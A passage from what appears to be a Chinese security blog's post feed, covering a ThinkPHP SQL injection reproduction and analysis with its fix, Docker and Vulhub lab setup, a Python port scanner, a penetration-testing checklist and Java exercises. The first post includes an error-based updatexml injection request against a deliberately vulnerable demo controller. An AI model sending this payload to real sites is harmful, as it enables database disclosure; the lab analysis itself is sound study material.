class="number">50</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"test"</span>,<span class="string">"thinkphp"</span>);</span><br></pre></td></tr></table></figure></p><p>在 <code>\application\database.php</code> 中配置好数据库<br>同时在congfig.php中将app_debug开为true<br>接下来在<code>\application\index\controller\Index.php</code><br>写一个 update 功能的 demo<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$username</span> = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">  /<span class="regexp">/ dump($password)."&lt;br&gt;";</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ echo(db('user')-&gt;where(['id'=&gt;1])-&gt;update(['password'=&gt;$password]))."&lt;br&gt;";</span></span><br><span class="line"><span class="regexp">  Db::table("user")-&gt;where(["id"=&gt;1])-&gt;insert(["username"=&gt;$username]);</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/dump(Db::table('user')-&gt;where('id',1)-&gt;find());</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$n</span>ame = input(<span class="comment">"get.username/a"</span>);</span><br></pre></td></tr></table></figure><p>input()为TP框架的助手函数，get.name/a 表示获取get传入的name变量，并将其强制转换为数组类型<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::table<span class="function"><span class="params">(<span class="string">"user"</span>)</span>-&gt;</span>where<span class="function"><span class="params">([<span class="string">"id"</span>=&gt;<span class="number">1</span>])</span>-&gt;</span>insert([<span class="string">"username"</span>=&gt;$username]);</span><br></pre></td></tr></table></figure></p><p>用来向数据库中插入数据<br>接下来访问<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php/index/index/index?username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lutdt6uoj31160dwjt8.jpg" alt=""></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当输入数据<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>由input()获得数据<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lw2y09s4j30i004ggn9.jpg" alt=""></p><p>接着调用了update()方法 在thinkphp/library/think/db/Query.php:2078<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwd536fhj30sk0dydhl.jpg" alt=""><br>在 2094 行会调用thinkphp/library/think/db/Builder.php:720： 下的insert()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwfmeyfkj30km0dl0tx.jpg" alt=""><br>接着会调用parseData()解析数据 在/library/think/db/Builder.php:86<br>从101 行开始分析:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lwlm2ja0j30p50ia0uu.jpg" alt=""><br>将变量赋给$key 值赋给$var 即:<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key : <span class="string">"username"</span></span><br><span class="line">$val : &#123;<span class="string">"inc"</span>,<span class="string">"updatexml(1,concat(0x7,user(),0x7e),1)"</span>,<span class="string">"1"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>当$val[0] = inc 时 将$val[1] 与 $var[2] 进行拼接<br>虽然调用parseKey()处理 在thinkphp/library/think/db/builder/Mysql.php:90</p><p>可见并没有什么过滤，不过在某些情况下会用反引号把字段的值包起来，可能会影响payload的构造。</p><p>floatval()是将数据转化为浮点数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lx6wd4e5j30gb05nq2z.jpg" alt=""></p><p>接着回到 thinkphp/library/think/db/Query.php 的 insert 中：</p><p>在updata()中同样调用了parseData()函数 因此原理和利用是一样的</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1lxdjwnw6j30pm0gkgnc.jpg" alt=""><br>只有当$val[1]==$key键值时才能进行拼接</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bbs.ichunqiu.com/thread-38284-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-38284-1-1.html</a><br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a><br><a href="https://xz.aliyun.com/t/2812#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2812#toc-5</a><br><a href="https://seaii-blog.com/index.php/2018/04/08/80.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2018/04/08/80.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用Xshell玩服务器</title>
      <link href="/2019/03/30/%E4%BD%BF%E7%94%A8Xshell%E7%8E%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2019/03/30/%E4%BD%BF%E7%94%A8Xshell%E7%8E%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们购买ubuntu服务器时 默认只能用ubuntu取登入  很多权限多用不了<br>接下来使用Xshell进行连接连接服务器</p><h1 id="Xshell连接服务器"><a href="#Xshell连接服务器" class="headerlink" title="Xshell连接服务器"></a>Xshell连接服务器</h1><p>在腾讯云下载ssh秘钥(我用的是腾讯云的服务器)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx6mkz2uj30fj07mwf3.jpg" alt=""></p><p>然后使用Xshell连接<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx7gfzizj30ho0f6wgn.jpg" alt=""></p><p>输入公网ip然后点击连接<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx7uss7ej30dn06omxt.jpg" alt=""></p><p>然后导入秘钥即可连接成功<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kx8ebjjsj30er0bpgnj.jpg" alt=""></p><h1 id="获得root权限"><a href="#获得root权限" class="headerlink" title="获得root权限"></a>获得root权限</h1><p>先用ubuntu登入服务器，然后我们输入sudo passwd root  进行修改root密码</p><p>然后我们输入sudo vi /etc/ssh/sshd_config,将第二个改为yes</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxbnbfhrj309k027t8j.jpg" alt=""></p><p>wq保存。</p><p>然后我们输入sudo service ssh restart 点回车 。接下来就可以用root登入了</p><p>如果在登入中不能使用密码登入的话,<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxnnusrqj30dx0ch3z2.jpg" alt=""><br>修改如下文件：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure></p><p>将该配置改为yes：</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1kxon9xphj30mz0dowft.jpg" alt=""><br>接着保存退出,然后重启sshd服务</p><p>service sshd restart</p><p>然后用xshell重新登陆，就可以出现输入密码的界面了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>docker学习</title>
      <link href="/2019/03/28/docker%E5%AD%A6%E4%B9%A0%E5%8F%8AVulhub%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/03/28/docker%E5%AD%A6%E4%B9%A0%E5%8F%8AVulhub%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在ubuntu下<br>1、更新系统软件<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure></p><p>2、安装依赖包<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> install</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install apt-transport-https</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install ca-certificates</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> install curl</span><br><span class="line">$ sudo apt-<span class="builtin-name">get</span> installsoft ware-properties-common</span><br></pre></td></tr></table></figure></p><p>3、添加官方密钥<br>执行该命令时，如遇到长时间没有响应说明网络连接不到docker网站，需要使用代-理进行。（建议更换源）<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>curl -fsSL <span class="symbol">https:</span>/<span class="regexp">/download.docker.com/linux</span><span class="regexp">/ubuntu/gpg</span> | sudo apt-key add -</span><br></pre></td></tr></table></figure></p><p>显示OK,表示添加成功.</p><p>4、添加仓库<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo<span class="built_in"> add-apt-repository </span><span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span></span><br></pre></td></tr></table></figure></p><p>5、再次更新软件<br>我们需要再次把软件更新到最新，否则下一步有可能会报错，（ubuntu源自行更换为国内源，推荐阿里源）<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure></p><p>6、安装docker<br>默认就会安装最新版<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="builtin-name">get</span> install docker-ce</span><br></pre></td></tr></table></figure></p><p>7、查看docker版本<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker -v</span><br></pre></td></tr></table></figure></p><p>显示“Docker version xx.xx.x-ce, build afdb6d4”字样，表示安装成功。</p><p>8.安装docker-compose</p><p>pip install docker-compose<br> 没有pip 建议先安装pip （python3可选）</p><p> curl -s <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a> | python</p><h1 id="玩转容器与镜像"><a href="#玩转容器与镜像" class="headerlink" title="玩转容器与镜像"></a>玩转容器与镜像</h1><p>可以先使用<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span>   <span class="comment">// 查看运行中的docker容器</span></span><br></pre></td></tr></table></figure></p><p>然后使用如下命令进入一个容器<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> docker attach <span class="variable">$id</span></span><br></pre></td></tr></table></figure></p><p>退出容器:<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + <span class="keyword">D</span></span><br></pre></td></tr></table></figure></p><h1 id="利用Vulhub"><a href="#利用Vulhub" class="headerlink" title="利用Vulhub"></a>利用Vulhub</h1><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。<br>下载环境<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure></p><p>搭建一个thinkphp 的漏洞环境</p><p>进入thinkphp目录：vulhub/thinkphp/in-sqlinjection<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1ix2uwxw1j30nk05w3z6.jpg" alt=""></p><p>然后运行如下命令<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p><p>然后运行如下命令 查看映射到哪个端口 然后用 外网+端口 访问即可<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure></p><p>运行命令： docker-compose up -d</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/yeasy/docker_practice/blob/master/SUMMARY.md" target="_blank" rel="noopener">https://github.com/yeasy/docker_practice/blob/master/SUMMARY.md</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>python编写的简单端口扫描器</title>
      <link href="/2019/03/26/python%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E5%8D%95%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
      <url>/2019/03/26/python%E7%BC%96%E5%86%99%E7%9A%84%E7%AE%80%E5%8D%95%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>python3下 运行成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connScan</span><span class="params">(tgtHost, tgtPort)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connSkt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        connSkt.connect((tgtHost, tgtPort))</span><br><span class="line">        print(<span class="string">"[+]%d/tcp open"</span> % tgtPort)</span><br><span class="line">        connSkt.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]%d/tcp close"</span> % tgtPort)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portScan</span><span class="params">(tgtHost)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tgtIP = socket.gethostbyname(tgtHost)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[-]cannot connect %s"</span> % tgtIP)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tgtName = socket.gethostbyaddr(tgtIP)</span><br><span class="line">        print(<span class="string">"\n[+]Scan results for:"</span> + tgtName[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\n[+]scan results for:"</span> + tgtIP)</span><br><span class="line">        socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">80</span>, <span class="number">90</span>):</span><br><span class="line">            print(<span class="string">"scanning port:"</span> + str(port))</span><br><span class="line">            connScan(tgtHost, int(port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-H"</span>, <span class="string">"--Host"</span>, dest=<span class="string">'tgtHost'</span>, help=<span class="string">'input Host address'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    <span class="keyword">if</span> (tgtHost == <span class="keyword">None</span>):</span><br><span class="line">        print(<span class="string">'----you must input Host-----'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    portScan(tgtHost)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试流程</title>
      <link href="/2019/03/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2019/03/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下渗透测试的一般流程,以免自己在渗透测试中遗忘</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>真实ip查询<br>常用的工具有多个地点ping服务器-网站测速-站长工具<br>最重要的就是信息收集<br>使用字典枚举目录<br>使用爬虫爬取整个网站，或者使用google等搜索引擎获取<br>查看robots.txt是否泄漏<br>指纹识别<br>使应用程序报错，查看报错信息<br>扫描服务器的数据库端口<br>用到的框架：很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。</p><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>搜索引擎（google，baidu，bing）,DNS区域传送漏洞，子域名挖掘机Layer,subDomainsBrute,phpinfo.me,定制字典暴力破解。<br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><h2 id="旁站C段查询"><a href="#旁站C段查询" class="headerlink" title="旁站C段查询"></a>旁站C段查询</h2><p>旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有webscancc，Nmap，Zenmap。</p><h2 id="cms类型"><a href="#cms类型" class="headerlink" title="cms类型"></a>cms类型</h2><p>对目标渗透测试过程中，目标CMS是十分重要的信息，有了目标的CMS，就可以利用相关的bug进行测试，进行代码审计。CMS识别方式有网站特有文件，例如/templets/default/style/dedecms.css — dedecms；网站独有文件的md5，例如favicon.ico，但是该文件可以被修改导致不准确；网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息；常用的工具有 云悉，工具1，BugScaner。</p><h2 id="敏感目录-文件"><a href="#敏感目录-文件" class="headerlink" title="敏感目录/文件"></a>敏感目录/文件</h2><p>用扫描器扫描目录，这时候你需要一本强大的字典，重在平时积累。字典越强扫描处的结果可能越多，这一步主要扫出网站的管理员入口，一些敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用的工具有：御剑，kali下的dirb，DirBrute。</p><h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><p>服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大。开始扫描之前不妨使用telnet先简单探测下某些端口是否开放，避免使用扫描器而被封IP，扫描全端口一般使用Nmap，masscan进行扫描探测，尽可能多的搜集开启的端口好已经对应的服务版本，得到确切的服务版本后可以搜索有没有对应版本的漏洞。常见的端口信息及渗透方法。</p><h2 id="服务器与中间件信息"><a href="#服务器与中间件信息" class="headerlink" title="服务器与中间件信息"></a>服务器与中间件信息</h2><p>通过Nmap、Zmap等端口和指纹识别功能搜集，也可以使用nc和telnet获取Banner信息进行识别，常用工具有whatweb</p><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>扫描SQL注射，XSS,文件包含，命令执行等高危漏洞</p><ol><li>自动化扫描工具</li></ol><p>　　　　Burpsuit —— 集成代理，爬行目录，漏扫，表单破解，编码解码，绝对的神器!</p><p>　　　　Awvs —— 可以和Burp换着用，效果会更好!</p><p>　　　　AppScan ——  IBM出品，以前很火的一款扫描工具!</p><p>　　2. 手动测试</p><p>　　　　需要耐心 !</p><p>　　　　扫描器扫不出逻辑漏洞，一些存储型XSS，和SQL注入漏洞，这些都需要手动测试 。<br>漏洞扫描</p><p>关于漏洞扫描的工具太多了，笔者这里仅仅推荐awvs<br>但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞</p><p>sql注入</p><p>sql注入可以说是非常常见了，相信你在挖掘这类漏洞的时候已经轻车熟路了，掌握常用的sql注入手法已经熟练使用sqlmap或者同类工具都非常重要。但是我们需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</p><p>xss漏洞</p><p>前端漏洞也是一个很大的板块，在做渗透测试的时候我们需要抓住一些细微的点，对每一个输出点都尽可能的测试，并且想方设法的去绕过</p><p>xxe漏洞</p><p>xxe漏洞不知道大家有没有过多的去关注，这类漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等，很值得我们去关注</p><p>逻辑漏洞</p><p>逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p><p>csrf</p><p>检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户</p><p>ssrf</p><p>在介绍信息收集的时候说过需要常常打开F12，以便于我们发现这种漏洞</p><p>未授权访问</p><p>这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p><p>弱口令，越权访问</p><p>可以通过爆破的方式发现弱口令，而越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p><p>各种框架漏洞</p><p>比如说structs这个框架的漏洞层出不穷，当明确了目标所使用何种框架之后，我们可以使用poc进行验证</p><p>信息泄露</p><p>信息泄露即通过各种搜索手段或者查看robots.txt之类的铭感目录得到铭感信息</p><p>文件包含</p><p>当我们在遇到文件上传并且有白名单校验的时候，利用文件包含可以轻松getshell</p><p>命令注入</p><p>命令注入的思路与sql注入思路是差不多的，都是对用户的输入过滤不严谨，关于这种漏洞笔者找到了几条相似案例：<br>搜狐某战点存在隐式命令注入<br>案例2</p><p>最后需要注意的是在进行漏洞发现的时候应该对每一个事件利用burpsuite进行抓包仔细观察数据包的传送情况，不放过任何一个可利用的点。</p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>JAVA实训题</title>
      <link href="/2019/03/25/JAVA%E5%AE%9E%E8%AE%AD%E9%A2%98/"/>
      <url>/2019/03/25/JAVA%E5%AE%9E%E8%AE%AD%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="第1关：随机数"><a href="#第1关：随机数" class="headerlink" title="第1关：随机数"></a>第1关：随机数</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> step1;</span><br><span class="line"><span class="keyword">public</span> class MaxMin&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">    <span class="keyword">double</span>[] arr = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">int</span> s=<span class="number">0</span>;<span class="comment">//定义 统计大于50的整数个数 变量</span></span><br><span class="line">        <span class="keyword">double</span> <span class="built_in">max</span>=<span class="number">0</span>,<span class="built_in">min</span>=<span class="number">100</span>;<span class="comment">//定义 最大值 最小值 变量</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> d=<span class="number">100</span>*Math.<span class="built_in">random</span>();<span class="comment">//获取随机数</span></span><br><span class="line">    arr[i] = d;</span><br><span class="line">        <span class="comment">/********* Begin *********/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(arr[i]&gt;<span class="built_in">max</span>) &#123;</span><br><span class="line">        <span class="built_in">max</span> = Math.<span class="built_in">floor</span>(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(arr[i]&lt;<span class="built_in">min</span>) &#123;</span><br><span class="line">        <span class="built_in">min</span> = Math.<span class="built_in">floor</span>(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&gt;<span class="number">50</span>) &#123;</span><br><span class="line">        s ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/********* end *********/</span></span><br><span class="line">        &#125;</span><br><span class="line">        judgeRadom.cpm(arr,<span class="built_in">max</span>,<span class="built_in">min</span>,s);<span class="comment">//这个方法会判断你的计算是否正确</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写程序，利用数组计算Fibonacci数列的前20个元素的值。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package step2;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String args[])&#123;</span><br><span class="line"><span class="comment">/*********begin********/</span></span><br><span class="line">        <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span 